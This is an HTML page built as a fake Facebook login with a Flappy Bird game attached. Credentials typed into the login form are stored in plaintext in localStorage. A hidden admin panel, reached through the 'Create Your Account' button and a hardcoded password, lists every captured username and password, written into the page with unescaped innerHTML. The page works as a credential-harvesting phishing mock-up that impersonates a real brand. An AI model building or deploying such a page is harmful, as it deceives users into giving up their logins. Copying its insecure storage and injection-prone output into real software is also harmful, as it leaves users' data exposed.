<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Facebook Style Login Game</title>
<style>
@import url('https://fonts.googleapis.com/css2?family=Roboto+Mono:wght@400;700&display=swap');

/* General body and container */
body {
    margin:0;
    font-family: Arial, sans-serif;
    background: #f0f2f5;
    display: flex;
    justify-content: center;
    align-items: center;
    min-height: 100vh;
}

.container {
    display: flex;
    gap: 50px;
    background: #ffffff;
    padding: 40px;
    border-radius: 10px;
    box-shadow: 0 0 15px rgba(0,0,0,0.2);
    max-width: 900px;
    width: 100%;
}

/* Recent Users */
.recent-users {
    flex: 1;
}
.recent-users h2 {
    font-size: 24px;
    color: #1c1e21;
    margin-bottom: 10px;
}
.user-boxes {
    display: flex;
    gap: 10px;
    flex-wrap: wrap;
}
.add-user {
    display:flex;
    justify-content:center;
    align-items:center;
    background:#e4e6eb;
    font-size: 30px;
    border-radius: 50%;
    width: 80px;
    height: 80px;
    cursor:pointer;
}

/* Login / Create Account Box */
.login-box, .create-box {
    flex: 1;
    max-width: 300px;
}

.login-box h1 {
    color:#1877f2;
    font-size: 40px;
    margin-bottom: 20px;
    text-align: center;
}

/* Inputs */
.login-box input,
.create-box input {
    width: 100%;
    box-sizing: border-box;
    padding: 12px;
    margin: 10px 0;
    border-radius: 6px;
    border: none;
    background: #000;
    color: #fff;
    font-size: 14px;
}

/* Buttons */
.login-btn, .create-btn, .small-btn {
    width: 100%;
    padding: 12px;
    border: none;
    border-radius: 6px;
    font-size: 16px;
    cursor: pointer;
    margin-top: 10px;
}

.login-btn {background: #1877f2; color:white;}
.login-btn:hover {background: #165fc1;}
.create-btn {background: #42b72a; color:white;}
.create-btn:hover {background: #36a420;}
.small-btn {background: #1877f2; color:white;}
.small-btn:hover {background: #165fc1;}

.forgot {
    display:block;
    text-align:center;
    margin-top: 10px;
    color:#1877f2;
    font-size: 14px;
    text-decoration: none;
}

/* GAME SECTION */
#game-section {
    display:none;
    width: 100%;
    max-width: 500px;
    text-align:center;
}

#flappy-game {
    position: relative;
    background: #70c5ce;
    width: 100%;
    height: 400px;
    border-radius: 10px;
    overflow: hidden;
    margin-bottom: 10px;
}

.bird {
    position: absolute;
    width: 34px;
    height: 24px;
    background: yellow;
    border-radius: 50%;
    top: 180px;
    left: 50px;
}

.pipe {
    position: absolute;
    width: 50px;
    background: #228B22;
}

.pipe-top {border-radius: 0 0 10px 10px;}
.pipe-bottom {border-radius: 10px 10px 0 0;}

/* ADMIN PANEL */
#admin-section {
    display: none;
    width: 100%;
    max-width: 400px;
    background: #0f0f0f;
    padding: 40px 30px;
    border-radius: 15px;
    box-shadow: 0 0 25px rgba(0, 255, 255, 0.5);
    color: #00fff7;
    font-family: 'Roboto Mono', monospace;
    text-align: center;
    margin: 50px auto;
}

#admin-section h2 {
    font-size: 28px;
    margin-bottom: 20px;
    color: #00fff7;
    text-shadow: 0 0 10px #00fff7;
}

#admin-section input {
    width: 90%;
    padding: 12px;
    margin: 10px 0;
    border-radius: 8px;
    border: 1px solid #00fff7;
    background: #0f0f0f;
    color: #00fff7;
    font-family: 'Roboto Mono', monospace;
    font-size: 16px;
}

#admin-section input:focus {
    outline: none;
    border-color: #0ff;
    box-shadow: 0 0 8px #0ff;
}

#admin-section .small-btn {
    margin-top: 15px;
    background: #00fff7;
    color: #0f0f0f;
    border: none;
    padding: 10px 20px;
    border-radius: 8px;
    cursor: pointer;
    font-family: 'Roboto Mono', monospace;
    font-weight: bold;
    transition: 0.3s;
}

#admin-section .small-btn:hover {
    background: #00b3b3;
    color: #fff;
}

#admin-data {
    margin-top: 20px;
    text-align: left;
    color: #00fff7;
}

#user-list p {
    margin: 5px 0;
    padding: 5px;
    border-bottom: 1px solid #00fff7;
}
</style>
</head>
<body>

<div class="container" id="login-container">
    <!-- Left Recent Users -->
    <div class="recent-users">
        <h2>Recent Logins</h2>
        <p>Click your picture or add an account</p>
        <div class="user-boxes">
            <div class="add-user">+</div>
        </div>
    </div>

    <!-- Right Login -->
    <div class="login-box" id="login-section">
        <h1>facebook</h1>
        <input type="text" id="username" placeholder="Email or Phone">
        <input type="password" id="password" placeholder="Password">
        <button class="login-btn" onclick="loginUser()">Log In</button>
        <a href="#" class="forgot">Forgot password?</a>
        <button class="create-btn" onclick="showAdminLogin()">Create Your Account</button>
    </div>
</div>

<!-- GAME SECTION -->
<div id="game-section">
    <h2>Flappy Bird Game</h2>
    <div id="flappy-game">
        <div class="bird" id="bird"></div>
    </div>
    <h3>Score: <span id="score">0</span></h3>
    <button class="small-btn" onclick="backToLogin()">Back to Login</button>
</div>

<!-- ADMIN SECTION -->
<div id="admin-section">
    <h2>Admin Panel</h2>
    <div id="admin-login">
        <input type="password" id="admin-pass" placeholder="Enter Admin Password"><br>
        <button class="small-btn" onclick="checkAdmin()">Enter</button>
        <button class="small-btn" style="background:#444;color:#fff;" onclick="backToLogin()">Back</button>
    </div>
    <div id="admin-data" style="display:none;">
        <h3>Saved Login Users</h3>
        <div id="user-list"></div>
        <button class="small-btn" onclick="backToLogin()">Logout Admin</button>
    </div>
</div>

<script>
    // LOGIN FUNCTION
    function loginUser(){
        let user = document.getElementById("username").value;
        let pass = document.getElementById("password").value;
        if(!user||!pass){alert("Please enter both fields."); return;}

        let accounts = JSON.parse(localStorage.getItem("accounts")) || [];
        accounts.push({username:user,password:pass});
        localStorage.setItem("accounts", JSON.stringify(accounts));

        document.getElementById("login-container").style.display="none";
        document.getElementById("game-section").style.display="block";
        startGame();
    }

    // ADMIN FUNCTIONS
    function showAdminLogin(){
        document.getElementById("login-container").style.display="none";
        document.getElementById("admin-section").style.display="block";
    }

    function checkAdmin(){
        let pass = document.getElementById("admin-pass").value;
        if(pass==="secretlangpo143"){
            document.getElementById("admin-login").style.display="none";
            document.getElementById("admin-data").style.display="block";
            let users = JSON.parse(localStorage.getItem("accounts"))||[];
            let html="";
            users.forEach(u=>{html+=`<p>Username: ${u.username} | Password: ${u.password}</p>`;});
            document.getElementById("user-list").innerHTML=html;
        } else {alert("Wrong admin password!");}
    }

    function backToLogin(){
        document.getElementById("login-container").style.display="flex";
        document.getElementById("game-section").style.display="none";
        document.getElementById("admin-section").style.display="none";
        location.reload(); // reset game
    }

    // FLAPPY BIRD GAME
    let bird, birdTop, birdSpeed, pipes, gameInterval, score;
    function startGame(){
        bird = document.getElementById("bird");
        birdTop = 180;
        birdSpeed = 0;
        pipes = [];
        score = 0;
        document.getElementById("score").innerText = score;
        bird.style.top = birdTop + "px";

        let oldPipes = document.querySelectorAll(".pipe");
        oldPipes.forEach(p => p.remove());

        clearInterval(gameInterval);
        gameInterval = setInterval(gameLoop, 20);
        document.addEventListener("keydown", flap);
        document.addEventListener("click", flap);
    }

    function flap(){ birdSpeed = -5; }

    function gameLoop(){
        birdSpeed += 0.25;
        birdTop += birdSpeed;
        bird.style.top = birdTop + "px";

        if(Math.random() < 0.02) createPipe();

        pipes.forEach(p => {
            p.x -= 3;
            p.topPipe.style.left = p.x + "px";
            p.bottomPipe.style.left = p.x + "px";

            if((birdTop < p.topHeight || birdTop+24 > p.bottomY) && p.x < 80 && p.x + 50 > 50){
                endGame();
            }

            if(!p.counted && p.x + 50 < 50){
                score++;
                document.getElementById("score").innerText = score;
                p.counted = true;
            }
        });

        pipes = pipes.filter(p => p.x + 50 > 0);

        if(birdTop < 0 || birdTop > 400 - 24) endGame();
    }

    function createPipe(){
        let topHeight = Math.floor(Math.random()*200)+50;
        let gap = 120;
        let bottomY = topHeight + gap;

        let topPipe = document.createElement("div");
        topPipe.classList.add("pipe","pipe-top");
        topPipe.style.height = topHeight + "px";
        topPipe.style.top = "0px";
        topPipe.style.left = "500px";
        document.getElementById("flappy-game").appendChild(topPipe);

        let bottomPipe = document.createElement("div");
        bottomPipe.classList.add("pipe","pipe-bottom");
        bottomPipe.style.height = (400-bottomY) + "px";
        bottomPipe.style.top = bottomY + "px";
        bottomPipe.style.left = "500px";
        document.getElementById("flappy-game").appendChild(bottomPipe);

        pipes.push({x:500, topPipe, bottomPipe, topHeight, bottomY, counted:false});
    }

    function endGame(){
        clearInterval(gameInterval);
        alert("Game Over! Score: " + score);
        backToLogin();
    }
</script>

</body>
</html>
